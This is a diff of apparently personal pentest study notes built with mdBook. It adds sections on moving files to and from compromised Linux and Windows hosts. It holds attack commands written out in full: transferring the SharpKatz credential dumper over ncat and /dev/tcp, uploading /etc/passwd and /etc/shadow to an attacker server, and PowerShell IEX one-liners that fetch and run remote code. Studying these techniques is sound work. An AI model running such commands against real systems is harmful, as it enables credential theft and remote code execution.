@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-9c1f2d1e.js";
+            window.path_to_searchindex_js = "searchindex-a9e60022.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-daccd387.js"></script>
+        <script src="toc-e5413c43.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -205,6 +205,10 @@
 <li><a href="#hashcat">hashcat</a></li>
 <li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
 <li><a href="#nikto-cheatsheet">nikto</a></li>
+<li><a href="#powershell-file-transfer">powershell</a></li>
+<li><a href="#ncat-file-transfer">ncat</a></li>
+<li><a href="#netcat-file-transfer">netcat</a></li>
+<li><a href="#rdp-file-transfer">rdp</a></li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -573,6 +577,8 @@
 <li><a href="#cvss-common-vulnerability-scoring-system">CVSS</a></li>
 <li><a href="#openvas">openvas</a></li>
 <li><a href="#nessus">nessus</a></li>
+<li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
+<li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
 </ul>
 </li>
 </ul>
@@ -582,19 +588,25 @@
 <ul>
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
 <li><a href="#cap-theorem">cap_theorem</a></li>
+<li><a href="#ffuf-cheatsheet">ffuf</a></li>
+<li><a href="#hashcat">hashcat</a></li>
 <li><a href="#standard-http-headers">http_headers</a></li>
+<li><a href="#hydra-cheatsheet">hydra</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#make-files">make_files</a></li>
 <li><a href="#medusa-cheatsheet">medusa</a></li>
+<li><a href="#ncat-file-transfer">ncat</a></li>
 <li><a href="#neovim-cheatsheet">neovim</a></li>
+<li><a href="#netcat-file-transfer">netcat</a></li>
+<li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#nmap-cheatsheet">nmap</a></li>
+<li><a href="#powershell-file-transfer">powershell</a></li>
 <li><a href="#ranger-cheatsheet">ranger</a></li>
+<li><a href="#rdp-file-transfer">rdp</a></li>
 <li><a href="#regex-cheatsheet">regex</a></li>
 <li><a href="#sql-cheat-sheet">sql</a></li>
+<li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
 <li><a href="#multi-line-strings">yaml</a></li>
-<li><a href="#hydra-cheatsheet">hydra</a></li>
-<li><a href="#ffuf-cheatsheet">ffuf</a></li>
-<li><a href="#hashcat">hashcat</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
@@ -1889,6 +1901,182 @@ SELECT name, sid FROM sys.sql_logins
 <h3 id="comprehensive-scan-with-all-options"><a class="header" href="#comprehensive-scan-with-all-options">Comprehensive Scan with All Options</a></h3>
 <pre><code>nikto -h example.com -p 80,443 -ssl -Format htm -o report.html -Display V -Tuning 1,2,3,4,5,6,7,8,9
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="powershell-file-transfer"><a class="header" href="#powershell-file-transfer">PowerShell File Transfer</a></h1>
+<p>PowerShell Remoting (WinRM) can be used for file transfer operations when HTTP, HTTPS, or SMB are unavailable.</p>
+<h2 id="powershell-remoting-overview"><a class="header" href="#powershell-remoting-overview">PowerShell Remoting Overview</a></h2>
+<p>PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations.</p>
+<p>By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener:</p>
+<ul>
+<li><strong>TCP/5985</strong> for HTTP</li>
+<li><strong>TCP/5986</strong> for HTTPS</li>
+</ul>
+<h2 id="requirements"><a class="header" href="#requirements">Requirements</a></h2>
+<p>To create a PowerShell Remoting session on a remote computer, you will need:</p>
+<ul>
+<li>Administrative access, OR</li>
+<li>Be a member of the Remote Management Users group, OR</li>
+<li>Have explicit permissions for PowerShell Remoting in the session configuration</li>
+</ul>
+<h2 id="testing-connectivity"><a class="header" href="#testing-connectivity">Testing Connectivity</a></h2>
+<p>Test if WinRM port is open:</p>
+<pre><code class="language-powershell">Test-NetConnection -ComputerName DATABASE01 -Port 5985
+</code></pre>
+<h2 id="creating-a-powershell-session"><a class="header" href="#creating-a-powershell-session">Creating a PowerShell Session</a></h2>
+<p>Create a PowerShell Remoting session to a remote computer:</p>
+<pre><code class="language-powershell">$Session = New-PSSession -ComputerName DATABASE01
+</code></pre>
+<p>If credentials are needed:</p>
+<pre><code class="language-powershell">$Credential = Get-Credential
+$Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
+</code></pre>
+<h2 id="file-transfer-operations"><a class="header" href="#file-transfer-operations">File Transfer Operations</a></h2>
+<h3 id="copy-file-to-remote-session"><a class="header" href="#copy-file-to-remote-session">Copy File to Remote Session</a></h3>
+<p>Copy a file from localhost to the remote session:</p>
+<pre><code class="language-powershell">Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+</code></pre>
+<h3 id="copy-file-from-remote-session"><a class="header" href="#copy-file-from-remote-session">Copy File from Remote Session</a></h3>
+<p>Copy a file from the remote session to localhost:</p>
+<pre><code class="language-powershell">Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+</code></pre>
+<h2 id="common-cmdlets"><a class="header" href="#common-cmdlets">Common Cmdlets</a></h2>
+<ul>
+<li><code>New-PSSession</code>: Create a new PowerShell remoting session</li>
+<li><code>Copy-Item</code>: Copy files to/from remote sessions
+<ul>
+<li><code>-ToSession</code>: Copy to remote session</li>
+<li><code>-FromSession</code>: Copy from remote session</li>
+</ul>
+</li>
+<li><code>Test-NetConnection</code>: Test network connectivity to a remote host</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ncat-file-transfer"><a class="header" href="#ncat-file-transfer">Ncat File Transfer</a></h1>
+<p>Ncat is a modern reimplementation of Netcat produced by the Nmap Project. It supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.</p>
+<p><strong>Note:</strong> Ncat is used in HackTheBox’s PwnBox as <code>nc</code>, <code>ncat</code>, and <code>netcat</code>.</p>
+<h2 id="file-transfer-methods"><a class="header" href="#file-transfer-methods">File Transfer Methods</a></h2>
+<h3 id="method-1-compromised-machine-listening"><a class="header" href="#method-1-compromised-machine-listening">Method 1: Compromised Machine Listening</a></h3>
+<p><strong>Compromised machine (listening):</strong></p>
+<pre><code class="language-bash">ncat -l -p 8000 --recv-only &gt; SharpKatz.exe
+</code></pre>
+<p>The <code>--recv-only</code> flag closes the connection once the file transfer is finished.</p>
+<p><strong>Attack host (sending):</strong></p>
+<pre><code class="language-bash">ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre>
+<p>The <code>--send-only</code> flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with <code>--send-only</code>, there is no need to anticipate further incoming information.</p>
+<h3 id="method-2-attack-host-listening"><a class="header" href="#method-2-attack-host-listening">Method 2: Attack Host Listening</a></h3>
+<p><strong>Attack host (listening):</strong></p>
+<pre><code class="language-bash">sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised machine (receiving):</strong></p>
+<pre><code class="language-bash">ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe
+</code></pre>
+<h3 id="method-3-using-bash-devtcp-no-ncat-required"><a class="header" href="#method-3-using-bash-devtcp-no-ncat-required">Method 3: Using Bash /dev/tcp (No Ncat Required)</a></h3>
+<p><strong>Attack host (listening):</strong></p>
+<pre><code class="language-bash">sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised machine (receiving via /dev/tcp):</strong></p>
+<pre><code class="language-bash">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
+</code></pre>
+<h2 id="common-options"><a class="header" href="#common-options">Common Options</a></h2>
+<ul>
+<li><code>-l</code>: Listen mode</li>
+<li><code>-p &lt;port&gt;</code>: Specify port number</li>
+<li><code>--send-only</code>: Close connection once input is exhausted (sending side)</li>
+<li><code>--recv-only</code>: Close connection once file transfer is finished (receiving side)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="netcat-file-transfer"><a class="header" href="#netcat-file-transfer">Netcat File Transfer</a></h1>
+<p>Netcat (often abbreviated to <code>nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.</p>
+<p>The original Netcat was released by Hobbit in 1995, but it hasn’t been maintained despite its popularity.</p>
+<h2 id="file-transfer-methods-1"><a class="header" href="#file-transfer-methods-1">File Transfer Methods</a></h2>
+<p>The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.</p>
+<h3 id="method-1-compromised-machine-listening-1"><a class="header" href="#method-1-compromised-machine-listening-1">Method 1: Compromised Machine Listening</a></h3>
+<p><strong>Compromised machine (listening):</strong></p>
+<pre><code class="language-bash">nc -l -p 8000 &gt; SharpKatz.exe
+</code></pre>
+<p><strong>Attack host (sending):</strong></p>
+<pre><code class="language-bash">nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre>
+<p>The <code>-q 0</code> option tells Netcat to close the connection once it finishes, so you’ll know when the file transfer was completed.</p>
+<h3 id="method-2-attack-host-listening-1"><a class="header" href="#method-2-attack-host-listening-1">Method 2: Attack Host Listening</a></h3>
+<p><strong>Attack host (listening):</strong></p>
+<pre><code class="language-bash">sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised machine (receiving):</strong></p>
+<pre><code class="language-bash">nc 192.168.49.128 443 &gt; SharpKatz.exe
+</code></pre>
+<p>This method is useful in scenarios where there’s a firewall blocking inbound connections.</p>
+<h3 id="method-3-using-bash-devtcp-no-netcat-required"><a class="header" href="#method-3-using-bash-devtcp-no-netcat-required">Method 3: Using Bash /dev/tcp (No Netcat Required)</a></h3>
+<p>If Netcat is not available on the compromised machine, Bash supports read/write operations on a pseudo-device file <code>/dev/TCP/</code>.</p>
+<p><strong>Attack host (listening):</strong></p>
+<pre><code class="language-bash">sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised machine (receiving via /dev/tcp):</strong></p>
+<pre><code class="language-bash">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
+</code></pre>
+<p>Writing to this particular file makes Bash open a TCP connection to <code>host:port</code>, and this feature may be used for file transfers.</p>
+<p><strong>Note:</strong> The same operation can be used to transfer files from the compromised host to the attack host.</p>
+<h2 id="common-options-1"><a class="header" href="#common-options-1">Common Options</a></h2>
+<ul>
+<li><code>-l</code>: Listen mode</li>
+<li><code>-p &lt;port&gt;</code>: Specify port number</li>
+<li><code>-q &lt;seconds&gt;</code>: Wait specified seconds after EOF on stdin, then quit (0 = quit immediately)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="rdp-file-transfer"><a class="header" href="#rdp-file-transfer">RDP File Transfer</a></h1>
+<p>RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP through multiple methods.</p>
+<h2 id="method-1-copy-and-paste"><a class="header" href="#method-1-copy-and-paste">Method 1: Copy and Paste</a></h2>
+<p>The simplest method is copying and pasting files:</p>
+<ol>
+<li>Right-click and copy a file from the Windows machine you connect to</li>
+<li>Paste it into the RDP session</li>
+</ol>
+<p><strong>Note:</strong> If connecting from Linux using <code>xfreerdp</code> or <code>rdesktop</code>, copy from the target machine to the RDP session may work, but there may be scenarios where this may not work as expected.</p>
+<h2 id="method-2-mount-local-folder-linux-to-windows"><a class="header" href="#method-2-mount-local-folder-linux-to-windows">Method 2: Mount Local Folder (Linux to Windows)</a></h2>
+<p>As an alternative to copy and paste, we can mount a local resource on the target RDP server.</p>
+<h3 id="using-rdesktop"><a class="header" href="#using-rdesktop">Using rdesktop</a></h3>
+<p>Mount a Linux folder using <code>rdesktop</code>:</p>
+<pre><code class="language-bash">rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+</code></pre>
+<h3 id="using-xfreerdp"><a class="header" href="#using-xfreerdp">Using xfreerdp</a></h3>
+<p>Mount a Linux folder using <code>xfreerdp</code>:</p>
+<pre><code class="language-bash">xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+</code></pre>
+<h3 id="accessing-the-mounted-drive"><a class="header" href="#accessing-the-mounted-drive">Accessing the Mounted Drive</a></h3>
+<p>To access the directory in the RDP session, connect to <code>\\tsclient\</code>:</p>
+<ul>
+<li>Navigate to <code>\\tsclient\linux\</code> (or the name you specified)</li>
+<li>This allows you to transfer files to and from the RDP session</li>
+</ul>
+<h2 id="method-3-mount-local-drive-windows-to-windows"><a class="header" href="#method-3-mount-local-drive-windows-to-windows">Method 3: Mount Local Drive (Windows to Windows)</a></h2>
+<p>From Windows, use the native <code>mstsc.exe</code> remote desktop client:</p>
+<ol>
+<li>Open Remote Desktop Connection (<code>mstsc.exe</code>)</li>
+<li>Click “Show Options”</li>
+<li>Go to the “Local Resources” tab</li>
+<li>Click “More…” under “Local devices and resources”</li>
+<li>Expand “Drives” and select the drive(s) you want to share</li>
+<li>Click “OK” and connect</li>
+</ol>
+<p>After selecting the drive, you can interact with it in the remote session that follows.</p>
+<p><strong>Note:</strong> This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>
+<h2 id="common-options-2"><a class="header" href="#common-options-2">Common Options</a></h2>
+<h3 id="rdesktop"><a class="header" href="#rdesktop">rdesktop</a></h3>
+<ul>
+<li><code>-d &lt;domain&gt;</code>: Domain name</li>
+<li><code>-u &lt;user&gt;</code>: Username</li>
+<li><code>-p &lt;password&gt;</code>: Password</li>
+<li><code>-r disk:&lt;name&gt;=&lt;path&gt;</code>: Mount local directory as network drive</li>
+</ul>
+<h3 id="xfreerdp"><a class="header" href="#xfreerdp">xfreerdp</a></h3>
+<ul>
+<li><code>/v:&lt;host&gt;</code>: Server hostname or IP</li>
+<li><code>/d:&lt;domain&gt;</code>: Domain name</li>
+<li><code>/u:&lt;user&gt;</code>: Username</li>
+<li><code>/p:&lt;password&gt;</code>: Password</li>
+<li><code>/drive:&lt;name&gt;,&lt;path&gt;</code>: Mount local directory as network drive</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
 <p>Notes related to various cloud service providers.</p>
@@ -23345,6 +23533,11 @@ ac
 <li><a href="#nessus">nessus</a></li>
 <li><a href="#openvas">openvas</a></li>
 </ul>
+<h3 id="file-transfers"><a class="header" href="#file-transfers">File Transfers</a></h3>
+<ul>
+<li><a href="#linux-file-transfer-methods">linux</a></li>
+<li><a href="#windows-file-transfer-methods">windows</a></li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
@@ -24178,6 +24371,285 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 <h1 id="openvas"><a href="#openvas" class="header">openvas</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nessus"><a href="#nessus" class="header">nessus</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
+<h2 id="introduction-30"><a class="header" href="#introduction-30">Introduction</a></h2>
+<p>Linux provides many versatile tools for file transfers. Understanding these methods helps both attackers and defenders. Most malware uses HTTP/HTTPS for communication, though Linux also supports FTP, SMB, and other protocols.</p>
+<p><strong>Real-world example:</strong> Threat actors used a Bash script that attempted three download methods (cURL → wget → Python) to download malware via HTTP, demonstrating redundancy in file transfer methods.</p>
+<h2 id="download-operations"><a class="header" href="#download-operations">Download Operations</a></h2>
+<h3 id="base64-encoding--decoding"><a class="header" href="#base64-encoding--decoding">Base64 Encoding / Decoding</a></h3>
+<p>For small files without network communication. Encode on source, copy string, decode on target. Verify with MD5 checksums.</p>
+<p><strong>On source machine:</strong></p>
+<pre><code class="language-bash">md5sum id_rsa
+cat id_rsa |base64 -w 0;echo
+</code></pre>
+<p><strong>On target machine:</strong></p>
+<pre><code class="language-bash">echo -n '&lt;base64_string&gt;' | base64 -d &gt; id_rsa
+md5sum id_rsa  # Verify hash matches
+</code></pre>
+<h3 id="httphttps-downloads"><a class="header" href="#httphttps-downloads">HTTP/HTTPS Downloads</a></h3>
+<p>Most common method. Multiple tools available with fallback options.</p>
+<p><strong>cURL:</strong></p>
+<pre><code class="language-bash">curl http://&lt;IP&gt;/file.txt -o file.txt
+curl https://&lt;IP&gt;/file.txt -k -o file.txt  # -k ignores SSL cert errors
+</code></pre>
+<p><strong>wget:</strong></p>
+<pre><code class="language-bash">wget http://&lt;IP&gt;/file.txt
+wget --no-check-certificate https://&lt;IP&gt;/file.txt
+</code></pre>
+<p><strong>Python:</strong></p>
+<pre><code class="language-python">python3 -c "import urllib.request; urllib.request.urlretrieve('http://&lt;IP&gt;/file.txt', 'file.txt')"
+</code></pre>
+<p><strong>Bash (using /dev/tcp):</strong></p>
+<pre><code class="language-bash">exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/80
+echo -e "GET /file.txt HTTP/1.1\r\nHost: &lt;IP&gt;\r\nConnection: close\r\n\r\n" &gt;&amp;3
+cat &lt;&amp;3 &gt; file.txt
+</code></pre>
+<h3 id="ftp-downloads"><a class="header" href="#ftp-downloads">FTP Downloads</a></h3>
+<p><strong>Interactive FTP:</strong></p>
+<pre><code class="language-bash">ftp &lt;IP&gt;
+# Then: get file.txt
+</code></pre>
+<p><strong>Non-interactive FTP:</strong></p>
+<pre><code class="language-bash">echo -e "open &lt;IP&gt;\nuser anonymous\nbinary\nget file.txt\nbye" | ftp -n
+</code></pre>
+<p><strong>cURL FTP:</strong></p>
+<pre><code class="language-bash">curl ftp://&lt;IP&gt;/file.txt -u anonymous: -o file.txt
+</code></pre>
+<h3 id="scp-downloads"><a class="header" href="#scp-downloads">SCP Downloads</a></h3>
+<p>Secure Copy Protocol over SSH (TCP/22). Requires SSH server on source.</p>
+<p><strong>Setup SSH server:</strong></p>
+<pre><code class="language-bash">sudo systemctl enable ssh
+sudo systemctl start ssh
+netstat -lnpt  # Verify listening on port 22
+</code></pre>
+<p><strong>Download from remote:</strong></p>
+<pre><code class="language-bash">scp user@&lt;IP&gt;:/path/to/file.txt .
+# With password prompt, or use SSH keys
+</code></pre>
+<p><strong>Note:</strong> Create temporary user accounts for file transfers to avoid exposing primary credentials.</p>
+<h3 id="smb-downloads"><a class="header" href="#smb-downloads">SMB Downloads</a></h3>
+<p><strong>Install SMB client:</strong></p>
+<pre><code class="language-bash">sudo apt install smbclient  # Debian/Ubuntu
+sudo yum install samba-client  # RHEL/CentOS
+</code></pre>
+<p><strong>Download file:</strong></p>
+<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username
+# Then: get file.txt
+</code></pre>
+<p><strong>Or non-interactive:</strong></p>
+<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username -c "get file.txt"
+</code></pre>
+<h2 id="upload-operations"><a class="header" href="#upload-operations">Upload Operations</a></h2>
+<h3 id="web-upload"><a class="header" href="#web-upload">Web Upload</a></h3>
+<p>Use Python’s <code>uploadserver</code> module for file uploads via HTTP/HTTPS.</p>
+<p><strong>Setup upload server (HTTP):</strong></p>
+<pre><code class="language-bash">sudo python3 -m pip install --user uploadserver
+python3 -m uploadserver 8000
+</code></pre>
+<p><strong>Setup upload server (HTTPS):</strong></p>
+<pre><code class="language-bash"># Create self-signed certificate
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+# Start HTTPS server
+mkdir https &amp;&amp; cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+</code></pre>
+<p><strong>Upload from target:</strong></p>
+<pre><code class="language-bash"># Single file
+curl -X POST http://&lt;IP&gt;:8000/upload -F 'files=@/path/to/file'
+
+# Multiple files
+curl -X POST https://&lt;IP&gt;:443/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+</code></pre>
+<h3 id="alternative-web-file-transfer"><a class="header" href="#alternative-web-file-transfer">Alternative Web File Transfer</a></h3>
+<p>Start a simple web server on target machine, then download from attacker machine.</p>
+<p><strong>Python3 HTTP server:</strong></p>
+<pre><code class="language-bash">python3 -m http.server 8000
+# Access from attacker: wget http://&lt;IP&gt;:8000/file.txt
+</code></pre>
+<p><strong>Python2.7 HTTP server:</strong></p>
+<pre><code class="language-bash">python2.7 -m SimpleHTTPServer 8000
+</code></pre>
+<p><strong>PHP HTTP server:</strong></p>
+<pre><code class="language-bash">php -S 0.0.0.0:8000
+</code></pre>
+<p><strong>Ruby HTTP server:</strong></p>
+<pre><code class="language-bash">ruby -run -ehttpd . -p8000
+</code></pre>
+<p><strong>Note:</strong> Inbound traffic may be blocked. This method transfers from target to attacker (download from attacker’s perspective).</p>
+<h3 id="scp-upload"><a class="header" href="#scp-upload">SCP Upload</a></h3>
+<p>If SSH (TCP/22) outbound is allowed, upload files to SSH server.</p>
+<p><strong>Upload to remote:</strong></p>
+<pre><code class="language-bash">scp /etc/passwd user@&lt;IP&gt;:/home/user/
+# Syntax similar to cp: scp &lt;source&gt; &lt;destination&gt;
+</code></pre>
+<p><strong>Upload directory:</strong></p>
+<pre><code class="language-bash">scp -r /path/to/directory user@&lt;IP&gt;:/home/user/
+</code></pre>
+<h3 id="ftp-uploads"><a class="header" href="#ftp-uploads">FTP Uploads</a></h3>
+<p><strong>Setup FTP server:</strong></p>
+<pre><code class="language-bash">sudo python3 -m pyftpdlib --port 21 --write
+</code></pre>
+<p><strong>Upload with cURL:</strong></p>
+<pre><code class="language-bash">curl -T file.txt ftp://&lt;IP&gt;/ --user anonymous:
+</code></pre>
+<p><strong>Upload with FTP client:</strong></p>
+<pre><code class="language-bash">echo -e "open &lt;IP&gt;\nuser anonymous\nbinary\nput file.txt\nbye" | ftp -n
+</code></pre>
+<h3 id="smb-uploads"><a class="header" href="#smb-uploads">SMB Uploads</a></h3>
+<p><strong>Upload file:</strong></p>
+<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username -c "put file.txt"
+</code></pre>
+<p><strong>Mount and copy:</strong></p>
+<pre><code class="language-bash">sudo mkdir /mnt/smb
+sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
+cp file.txt /mnt/smb/
+sudo umount /mnt/smb
+</code></pre>
+<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
+<ul>
+<li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
+<li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
+<li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
+<li><strong>SCP/SSH</strong>: Secure, requires SSH server, TCP/22 may be blocked outbound</li>
+<li><strong>SMB</strong>: Common in enterprise, may require authentication</li>
+<li><strong>Web servers</strong>: Python/PHP/Ruby can quickly serve files for download</li>
+<li><strong>Upload servers</strong>: Python uploadserver module for receiving files</li>
+</ul>
+<p><strong>Redundancy strategy:</strong> Try multiple methods (curl → wget → Python) for reliability.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windows-file-transfer-methods"><a class="header" href="#windows-file-transfer-methods">Windows File Transfer Methods</a></h1>
+<h2 id="introduction-31"><a class="header" href="#introduction-31">Introduction</a></h2>
+<p>Windows provides various native utilities for file transfer operations. Understanding these methods is important for both attackers (to operate and evade detection) and defenders (to monitor and create policies).</p>
+<p><strong>Fileless attacks</strong> use legitimate built-in tools to execute attacks without dropping files to disk. The Microsoft Astaroth APT attack demonstrates this - it used WMIC, Bitsadmin, Certutil, and Regsvr32 to download, decode, and execute payloads in memory.</p>
+<h2 id="download-operations-1"><a class="header" href="#download-operations-1">Download Operations</a></h2>
+<h3 id="powershell-base64-encode--decode"><a class="header" href="#powershell-base64-encode--decode">PowerShell Base64 Encode &amp; Decode</a></h3>
+<p>For small files, encode on attacker machine, copy string, and decode on target. Verify integrity with MD5 checksums.</p>
+<p><strong>On attacker machine:</strong></p>
+<pre><code class="language-bash">md5sum id_rsa
+cat id_rsa |base64 -w 0;echo
+</code></pre>
+<p><strong>On Windows target:</strong></p>
+<pre><code class="language-powershell">[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("&lt;base64_string&gt;"))
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+</code></pre>
+<p><strong>Limitations:</strong> Windows cmd.exe has max string length of 8,191 characters. Web shells may error on very large strings.</p>
+<h3 id="powershell-web-downloads"><a class="header" href="#powershell-web-downloads">PowerShell Web Downloads</a></h3>
+<p>Most companies allow HTTP/HTTPS outbound traffic. PowerShell’s <code>System.Net.WebClient</code> class provides multiple download methods:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Method</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>DownloadFile</code></td><td>Downloads to local file</td></tr>
+<tr><td><code>DownloadFileAsync</code></td><td>Async version of DownloadFile</td></tr>
+<tr><td><code>DownloadString</code></td><td>Downloads as string (for fileless execution)</td></tr>
+<tr><td><code>DownloadData</code></td><td>Downloads as byte array</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>DownloadFile:</strong></p>
+<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('&lt;URL&gt;','&lt;Output File&gt;')
+</code></pre>
+<p><strong>DownloadString (Fileless):</strong></p>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('&lt;URL&gt;')
+# Or with pipeline:
+(New-Object Net.WebClient).DownloadString('&lt;URL&gt;') | IEX
+</code></pre>
+<p><strong>Invoke-WebRequest (PowerShell 3.0+):</strong></p>
+<pre><code class="language-powershell">Invoke-WebRequest &lt;URL&gt; -OutFile &lt;filename&gt;
+# Aliases: iwr, curl, wget
+</code></pre>
+<p><strong>Common Errors &amp; Fixes:</strong></p>
+<ol>
+<li><strong>IE first-launch configuration error:</strong></li>
+</ol>
+<pre><code class="language-powershell">Invoke-WebRequest &lt;URL&gt; -UseBasicParsing | IEX
+</code></pre>
+<ol start="2">
+<li><strong>SSL/TLS certificate trust error:</strong></li>
+</ol>
+<pre><code class="language-powershell">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+</code></pre>
+<h3 id="smb-downloads-1"><a class="header" href="#smb-downloads-1">SMB Downloads</a></h3>
+<p>SMB (TCP/445) is common in enterprise Windows networks. Create SMB server with Impacket:</p>
+<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare
+</code></pre>
+<p><strong>Download from Windows:</strong></p>
+<pre><code class="language-cmd">copy \\&lt;IP&gt;\share\&lt;file&gt;
+</code></pre>
+<p><strong>Note:</strong> Newer Windows blocks unauthenticated guest access. Use credentials:</p>
+<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+</code></pre>
+<pre><code class="language-cmd">net use n: \\&lt;IP&gt;\share /user:test test
+copy n:\&lt;file&gt;
+</code></pre>
+<h3 id="ftp-downloads-1"><a class="header" href="#ftp-downloads-1">FTP Downloads</a></h3>
+<p>FTP uses TCP/21 and TCP/20. Setup Python FTP server:</p>
+<pre><code class="language-bash">sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+</code></pre>
+<p><strong>Download with PowerShell:</strong></p>
+<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('ftp://&lt;IP&gt;/file.txt', 'C:\Users\Public\ftp-file.txt')
+</code></pre>
+<p><strong>Download with FTP client (non-interactive):</strong></p>
+<pre><code class="language-cmd">echo open &lt;IP&gt; &gt; ftpcommand.txt
+echo USER anonymous &gt;&gt; ftpcommand.txt
+echo binary &gt;&gt; ftpcommand.txt
+echo GET file.txt &gt;&gt; ftpcommand.txt
+echo bye &gt;&gt; ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+</code></pre>
+<h2 id="upload-operations-1"><a class="header" href="#upload-operations-1">Upload Operations</a></h2>
+<h3 id="powershell-base64-encode--decode-1"><a class="header" href="#powershell-base64-encode--decode-1">PowerShell Base64 Encode &amp; Decode</a></h3>
+<p><strong>Encode on Windows:</strong></p>
+<pre><code class="language-powershell">[Convert]::ToBase64String((Get-Content -path "&lt;file&gt;" -Encoding byte))
+Get-FileHash "&lt;file&gt;" -Algorithm MD5 | select Hash
+</code></pre>
+<p><strong>Decode on attacker machine:</strong></p>
+<pre><code class="language-bash">echo "&lt;base64_string&gt;" | base64 -d -w 0 &gt; &lt;output_file&gt;
+md5sum &lt;output_file&gt;  # Verify hash matches
+</code></pre>
+<h3 id="smb-uploads-1"><a class="header" href="#smb-uploads-1">SMB Uploads</a></h3>
+<p>SMB (TCP/445) is often blocked outbound. Use <strong>WebDAV</strong> (HTTP/HTTPS extension) as alternative - Windows will try SMB first, then fall back to HTTP.</p>
+<p><strong>Setup WebDAV server:</strong></p>
+<pre><code class="language-bash">sudo pip3 install wsgidav cheroot
